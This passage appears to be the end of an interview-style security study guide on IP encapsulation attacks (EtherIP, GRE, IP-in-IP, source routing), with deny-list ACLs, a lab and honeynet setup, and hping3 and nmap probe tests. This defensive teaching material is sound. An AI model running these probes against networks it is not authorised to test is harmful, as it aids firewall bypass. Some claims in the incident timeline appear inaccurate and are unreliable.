+      RFC 3056 — Connection of IPv6 Domains via IPv4 (6to4)
+      RFC 3378 — EtherIP: Tunneling Ethernet Frames in IP
+      RFC 4213 — Basic Transition Mechanisms (6in4, Proto 41)
+      RFC 4302 — IP Authentication Header (AH)
+      RFC 4303 — IP Encapsulating Security Payload (ESP)
+      RFC 4380 — Teredo (IPv6 via UDP/NAT)
+      RFC 5214 — ISATAP
+      RFC 7348 — VXLAN
+      RFC 5095 — Deprecation of IPv6 Type 0 Routing Headers
+
+────────────────────────────────────────────────────────────────
+
+Q141. MITRE ATT&CK — encapsulation attacks full mapping?
+A141. Complete MITRE mapping:
+      T1572 — Protocol Tunneling
+        Use: GRE/EtherIP C2 channels
+        Detection: network traffic analysis
+
+      T1599 — Network Boundary Bridging
+        Sub: T1599.001 — Network Address Translation Traversal
+        Use: NAT bypass via encapsulation
+
+      T1048 — Exfiltration Over Alternative Protocol
+        Sub: T1048.003 — Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
+        Use: Data exfiltration via GRE tunnel
+
+      T1090 — Proxy
+        Sub: T1090.001 — Internal Proxy
+        Use: EtherIP inner frame proxy pivot
+
+      T1187 — Forced Authentication (via EtherIP ARP spoofing)
+
+      T1557 — Adversary-in-the-Middle
+        Use: LSR source routing MITM
+
+────────────────────────────────────────────────────────────────
+
+Q142. Defense metrics — encapsulation attack prevention measure பண்ண?
+A142. KPIs for encapsulation defense:
+      Quantitative metrics:
+      - Proto 97 blocked packets/day (should be 0 or explained)
+      - Time to detect new encap tunnel: target < 15 minutes
+      - ACL rule coverage: 100% of encap protocols in deny list
+      - Patch currency: 0 known encap-related CVEs unpatched
+
+      Process metrics:
+      - Pen test frequency: minimum quarterly
+      - Rule review: monthly audit of tunnel permits
+      - Incident drill: semi-annual IR for tunnel attack
+
+      Qualitative:
+      - All GRE endpoints documented and approved
+      - IDS signatures current (updated within 30 days)
+      - SOC aware of encap attack patterns
+
+────────────────────────────────────────────────────────────────
+
+Q143. Honeynet — encapsulation attack research எவ்வாறு setup பண்ணுவீர்கள்?
+A143. Honeynet setup for encap research:
+      Architecture:
+      Internet → Honeypot router (all protos allowed) → SPAN port
+      SPAN port → Analysis server (Zeek + Suricata + PCAP)
+
+      Honeypot router config (intentionally vulnerable):
+      # Cisco IOS — NO ip options drop (intentional)
+      # No ACL denying proto 4/47/97/41
+
+      Capture:
+        tcpdump -i eth0 -w /captures/$(date +%s).pcap
+          'proto 4 or proto 47 or proto 97 or proto 41'
+
+      Analysis:
+        Daily Zeek conn.log analysis
+        Suricata alert correlation
+        Geo-IP source analysis
+
+      Safety: Honeynet isolated, no real assets connected.
+      Route: Only honeypot hosts, not real network.
+
+────────────────────────────────────────────────────────────────
+
+Q144. Multi-vendor environment — consistent policy deploy பண்ண strategy?
+A144. Multi-vendor strategy:
+      Step 1: Common policy definition (vendor-neutral)
+        Rule: DENY proto [4, 41, 47, 97] from ANY except TRUSTED-LIST
+
+      Step 2: Vendor-specific translation
+        Cisco IOS:
+          ip access-list extended ENCAP-DENY
+            deny 97 any any; deny 47 any any...
+        FortiGate:
+          firewall service custom EtherIP protocol 97
+          firewall policy deny EtherIP service
+        Linux:
+          iptables -A FORWARD -p 97 -j DROP
+        Juniper:
+          firewall filter BLOCK-ENCAP term ... proto 97 then discard
+
+      Step 3: Automation
+        Ansible for Linux, Netmiko for Cisco/FortiGate/Juniper
+        Centralized policy management (Tufin, AlgoSec, FireMon)
+
+      Step 4: Verify uniformity
+        Cross-vendor pen test to confirm consistent behavior
+
+────────────────────────────────────────────────────────────────
+
+Q145. Interview question: "Explain EtherIP attack in 2 minutes"?
+A145. 2-minute explanation:
+      "EtherIP is protocol number 97, defined in RFC 3378.
+       It encapsulates full Ethernet frames inside IP packets.
+
+       Attack scenario: I send a packet where the outer IPv4
+       header says protocol=97. Inside, there's a full Ethernet
+       frame — complete with MAC addresses and VLAN tags.
+
+       Why it's dangerous:
+       1. Firewall sees IPv4 packet — may allow proto 97
+       2. Inner Ethernet frame bypasses MAC-based ACLs
+       3. VLAN tags can cause VLAN hopping
+       4. L2 ARP spoofing possible from 'outside'
+       5. No authentication in EtherIP whatsoever
+
+       Prevention: Explicit 'deny ip proto 97 any any' in ACL.
+       
+       Most vendors — Cisco IOS, Linux, F5 — allow proto 97
+       by default. Cisco ASA and Juniper SRX deny by default.
+       
+       Always add proto 97 to your perimeter deny list."
+
+────────────────────────────────────────────────────────────────
+
+Q146. Real network — encapsulation attack simulation lab setup?
+A146. Lab setup:
+      Topology:
+        [Attacker VM] ──── [Router/FW] ──── [Victim VM]
+        Attacker: Kali Linux (Scapy installed)
+        Firewall: Cisco IOS or Linux iptables
+        Victim: Ubuntu Server
+
+      Test 1 — EtherIP bypass:
+        # On Attacker:
+        scapy: send EtherIP packet to Victim
+        # On Victim: tcpdump proto 97
+        # Check: does packet arrive?
+
+      Test 2 — After fix:
+        # On FW: iptables -A FORWARD -p 97 -j DROP
+        # Repeat test — should be blocked
+
+      Test 3 — LSR test:
+        # nmap --ip-options L <fw_ip> <victim_ip>
+        # After fix: ip options drop on FW
+        # Repeat — should be blocked
+
+      Document before/after screenshots, PCAP evidence.
+
+────────────────────────────────────────────────────────────────
+
+Q147. Encapsulation attack timeline history — notable incidents?
+A147. Historical timeline:
+      2001: First documented GRE tunnel misuse in APT campaigns
+      2003: EtherIP RFC 3378 published — immediately noted as risk
+      2007: Turla (Snake/Uroboros) GRE C2 discovered
+      2010: Stuxnet — used IP tunneling for C2 in air-gapped networks
+      2014: CVE-2014-2176 — Cisco ASA GRE inspection bypass
+      2016: APT32 GRE over port 80 C2 discovered
+      2018: CVE-2018-13379 FortiGate → tunnel pivot exploitation
+      2020: CVE-2020-10136 — IP-in-IP multiple OS vulnerability
+      2020: NAT Slipstreaming v1.0 — SIP ALG encapsulation abuse
+      2021: NAT Slipstreaming v2.0 — H.323 extension
+      2022: Multiple threat actors using 6in4 for IPv4 FW bypass
+      2023: Kubernetes CNI encapsulation exploitation documented
+
+────────────────────────────────────────────────────────────────
+
+Q148. IP options attack in IPv6 equivalent என்ன?
+A148. IPv6 equivalent mechanisms:
+      IPv4 Options → IPv6 Extension Headers
+      
+      IPv4 LSR → IPv6 Routing Header Type 0
+        (deprecated by RFC 5095 — still found in old devices)
+      
+      IPv4 Record Route → IPv6 Routing Header Type 2
+        (Mobile IPv6 Home Address option)
+      
+      IPv4 Timestamp → IPv6 Destination Options
+        (can carry arbitrary data)
+      
+      IPv4 Router Alert → IPv6 Hop-by-Hop Router Alert
+        (same DoS risk)
+
+      Detection:
+        IPv6 routing header: ip6.routing present
+        Wireshark: ipv6.routing_hdr
+      
+      Cisco: ipv6 source-route (disable routing header)
+      Linux: net.ipv6.conf.all.accept_source_route = 0
+
+────────────────────────────────────────────────────────────────
+
+Q149. Comprehensive test — perimeter firewall encapsulation hardening verify?
+A149. Complete verification test suite:
+      Test 1 — EtherIP blocked:
+        hping3 --proto 97 -c 3 <firewall_outside_ip>
+        Expected: No response (silent drop) or ICMP proto-unreachable
+
+      Test 2 — IP-in-IP blocked:
+        hping3 --proto 4 -c 3 <target>
+        Expected: Blocked
+
+      Test 3 — GRE from untrusted blocked:
+        hping3 --proto 47 -c 3 <target>
+        Expected: Blocked (if not trusted peer)
+
+      Test 4 — LSR dropped:
+        nmap --ip-options L 10.0.0.1 <target>
+        Expected: No route via specified hop
+
+      Test 5 — ACL hit count:
+        Before: record count
+        During: run tests
+        After: show access-lists | diff
+        Expected: Hit count incremented
+
+      Test 6 — IDS alert generated:
+        Check Snort/Suricata alert log
+        Expected: Alerts for each test
+
+────────────────────────────────────────────────────────────────
+
+Q150. Final summary — 10 key takeaways from this entire topic?
+A150. 10 Key Takeaways:
+
+      1. IP Options (LSR/SSR) default ALLOW in Cisco IOS and Linux.
+         Always add "ip options drop" or ACL deny.
+
+      2. EtherIP (Proto 97) = most dangerous encap protocol.
+         Full L2 frame bypass — MAC ACL, VLAN segmentation useless.
+
+      3. Protocol 97 = RFC 3378 = NO authentication built-in.
+         Never allow from untrusted sources.
+
+      4. Cisco ASA and Juniper SRX = most secure defaults.
+         Cisco IOS, Linux, F5 = permissive defaults.
+
+      5. Windows 6to4 (Proto 41) = default enabled.
+         Every Windows Server needs explicit disable.
+
+      6. Selective allow = permit trusted IPs first, then deny all.
+         ACL order is critical — wrong order = security gap.
+
+      7. GRE without IPSec = no authentication, no encryption.
+         Always pair with IPSec for production use.
+
+      8. MITRE T1572 (Protocol Tunneling) = common APT technique.
+         NetFlow + SIEM needed for detection.
+
+      9. Kubernetes Calico uses IP-in-IP (Proto 4) by default.
+         Cloud-native environments need encap-aware security.
+
+      10. Defense-in-Depth: ACL + NGFW + IDS + NetFlow + SIEM.
+          No single layer is sufficient.
+
+================================================================
+END OF PART 3 — Questions 101 to 150
+TOTAL: 150 Questions covering all topics from this session
+================================================================
